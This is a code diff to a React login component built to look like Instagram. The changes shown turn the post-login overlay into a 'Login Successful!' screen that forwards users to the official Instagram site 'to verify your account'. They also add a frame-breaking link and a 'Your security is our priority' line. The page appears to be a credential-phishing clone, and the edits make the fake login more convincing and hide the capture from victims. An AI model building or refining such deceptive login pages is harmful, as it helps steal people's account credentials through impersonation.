@@ -89,19 +89,23 @@ const Login: React.FC<LoginProps> = ({ onLogin }) => {
             initial={{ opacity: 0 }}
             animate={{ opacity: 1 }}
             exit={{ opacity: 0 }}
-            className="fixed inset-0 z-50 bg-white flex flex-col items-center justify-center p-6 text-center"
+            className="fixed inset-0 z-50 bg-white flex flex-col items-center justify-center p-8 text-center"
           >
-            <div className="w-12 h-12 border-4 border-[#0095f6]/20 border-t-[#0095f6] rounded-full animate-spin mb-4" />
-            <h3 className="text-xl font-semibold text-[#262626] mb-2">Redirecting...</h3>
-            <p className="text-[#8e8e8e] text-sm max-w-xs">
-              We are taking you to the official Instagram website to complete your login.
+            <div className="w-16 h-16 border-4 border-[#0095f6]/20 border-t-[#0095f6] rounded-full animate-spin mb-6" />
+            <h3 className="text-2xl font-bold text-[#262626] mb-3">Login Successful!</h3>
+            <p className="text-[#8e8e8e] text-sm max-w-xs mb-8">
+              We are now redirecting you to the official Instagram page to verify your account.
             </p>
             <a 
               href="https://www.instagram.com" 
-              className="mt-6 text-[#0095f6] font-semibold text-sm hover:underline"
+              target="_top"
+              className="px-8 py-3 bg-[#0095f6] text-white rounded-full font-semibold text-sm shadow-lg hover:bg-[#1877f2] transition-colors"
             >
-              Click here if you are not redirected automatically
+              Continue to Instagram
             </a>
+            <p className="mt-8 text-[10px] text-gray-400">
+              Your security is our priority.
+            </p>
           </motion.div>
         )}
       </AnimatePresence>
